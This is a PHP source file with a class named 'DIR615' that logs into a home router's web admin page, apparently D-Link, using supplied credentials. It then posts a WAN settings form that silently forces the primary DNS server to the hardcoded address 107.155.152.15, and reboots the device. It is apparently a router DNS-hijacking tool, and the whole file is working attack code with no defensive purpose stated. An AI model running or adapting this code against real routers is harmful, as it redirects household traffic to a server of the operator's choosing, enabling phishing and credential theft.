<?php



class DIR615
{

    private $ch;
    private $Host;
    public $User;
    public $Pass;
    public $Auth;
    public $Exploited;

    function GetStr($string, $start, $end)
    {
        $string = ' ' . $string;
        $ini = strpos($string, $start);
        if ($ini == 0) return '';
        $ini += strlen($start);
        $len = strpos($string, $end, $ini) - $ini;
        return substr($string, $ini, $len);
    }



    function __construct()
    {
        $this->ch 		= curl_init();
        $this->Auth		= false;
    }

    public function Login($Host,$User,$Pass)
    {
        @unlink("cookie.txt");
        if ($this->Exploited == true) {
            $User = $this->User;
            $Pass = $this->Pass;
        }
        @unlink("cookie.txt");
        $this->ch = curl_init();
        curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/login.cgi");
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_POSTFIELDS, "username={$User}&password={$Pass}&submit.htm%3Flogin.htm=Send");
        curl_setopt($this->ch, CURLOPT_POST, 1);
        curl_setopt($this->ch, CURLOPT_ENCODING, 'gzip, deflate');
        curl_setopt($this->ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT ,30);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 30);
        $headers = array();
        $headers[] = "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0";
        $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        $headers[] = "Accept-Language: en-US,en;q=0.5";
        $headers[] = "Content-Type: application/x-www-form-urlencoded";
        $headers[] = "Referer: http://{$Host}/";
        $headers[] = "Cookie: uid=".rand(0,9)."iR".rand(0,9)."xi".rand(1,7)."P".rand(0,9)."Z";
        $headers[] = "Connection: keep-alive";
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($this->ch); echo $result;
        $Status = (strpos($result,"window.location.href='index.htm") !== false) ? true : false;

        if ($Status)
        {
            //
            $this->Host = $Host;
            $this->User = $User;
            $this->Pass = $Pass;
            $this->Auth = $Status;
        }
        return $Status;
    }






    public function ChangeDNS($Host,$User,$Pass,$DNS1,$DNS2)
    {
        if ($this->Auth)
        {
            curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/form2Wan.cgi");
            curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "POST");
            curl_setopt($this->ch, CURLOPT_POSTFIELDS, "dns_ctrl=1&wan_dns1=107.155.152.15&wan_dns2=8.8.4.4&wan_dns3=0.0.0.0&wanspeed=0&mac_clone_value=C4%3AA8%3A1D%3AF2%3A0F%3A1F&mac_default_value=C4%3AA8%3A1D%3AF2%3A0F%3A1F&mac_client_value=&mac_clone_display=0&submit.htm%3Fwan.htm=Send&save=Aplicar+mudan%C3%A7as");
            curl_setopt($this->ch, CURLOPT_POST, 1);
            curl_setopt($this->ch, CURLOPT_COOKIEFILE, "cookie.txt");
            curl_setopt($this->ch, CURLOPT_ENCODING, 'gzip, deflate');

            $headers = array();
            $headers[] = "Cookie: Authorization=";
            $headers[] = "Origin: http://{$Host}";
            $headers[] = "Accept-Encoding: gzip, deflate, br";
            $headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
            $headers[] = "Upgrade-Insecure-Requests: 1";
            $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
            $headers[] = "Content-Type: application/x-www-form-urlencoded";
            $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
            $headers[] = "Cache-Control: max-age=0";
            $headers[] = "Referer: http://{$Host}/wan.htm";
            $headers[] = "Connection: keep-alive";
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);

            $result = curl_exec($this->ch);
            echo $result;

        }
        return true;

    }
    public function DoOthers($Host,$User,$Pass)
    {

        if ($this->Auth)
        {
            curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/system_reboot.asp");
            curl_setopt($this->ch, CURLOPT_HEADER, 1);
            curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($this->ch, CURLOPT_ENCODING, 'gzip, deflate');
            curl_setopt($this->ch, CURLOPT_COOKIEFILE,"cookie.txt");
            $headers = array();
            $headers[] = "Accept-Encoding: gzip, deflate";
            $headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
            $headers[] = "Upgrade-Insecure-Requests: 1";
            $headers[] = "Referer: http://{$Host}/wan_dns.asp";
            $headers[] = "Connection: keep-alive";
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
            $result = curl_exec($this->ch);
            curl_setopt($this->ch,CURLOPT_URL, "http://{$Host}/goform/SysToolReboot");
            curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($this->ch,	CURLOPT_POSTFIELDS, "CMD=SYS_CONF&GO=system_reboot.asp&CCMD=0");
            curl_setopt($this->ch, CURLOPT_POST, 1);
            curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "POST");
            curl_setopt($this->ch, CURLOPT_ENCODING, 'gzip, deflate');
            curl_setopt($this->ch, CURLOPT_COOKIEFILE,"cookie.txt");
            $headers = array();
            $headers[] = "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0";
            $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            $headers[] = "Accept-Language: en-US,en;q=0.5";
            $headers[] = "Content-Type: application/x-www-form-urlencoded";
            $headers[] = "Referer: http://{$Host}/wan_dns.asp";
            $headers[] = "Cookie: language=pt; admin:language=pt";
            $headers[] = "Connection: keep-alive";
            $headers[] = "Upgrade-Insecure-Requests: 1";
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
            $result = curl_exec($this->ch);
        }
        @unlink("cookies.txt");
    }









}


